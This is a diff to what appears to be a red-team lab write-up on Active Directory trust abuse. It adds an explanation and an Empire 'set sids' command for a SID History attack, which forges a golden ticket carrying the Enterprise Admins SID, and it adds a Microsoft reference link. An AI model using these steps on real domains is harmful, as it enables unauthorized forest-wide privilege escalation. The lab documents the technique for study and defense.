@@ -187,6 +187,12 @@ usemodule powershell/credentials/mimikatz/golden_ticket
 (Empire: powershell/credentials/mimikatz/golden_ticket) > run
 ```
 
+Note how during `sids` specification, we replaced the last three digits from 502 \(krbtgt\) to 519 \(enterprise admins\) - this part of the process is called a SID History Attack:
+
+```csharp
+set sids S-1-5-21-4172452648-1021989953-2368502130-519
+```
+
 ![](../../.gitbook/assets/empire-golden-ticket.png)
 
 The `CredID` property in the dcsync module comes from the Empire's credential store which previously got populated by our mimikatz'ing:
@@ -216,4 +222,6 @@ For the sake of fun and wrapping this lab up, let's get an agent from the `dc-ma
 {% embed url="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=winserver2012-ps" %}
 
 {% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554\(v=ws.10\)" %}
+
+{% embed url="https://support.microsoft.com/en-gb/help/243330/well-known-security-identifiers-in-windows-operating-systems" %}
 
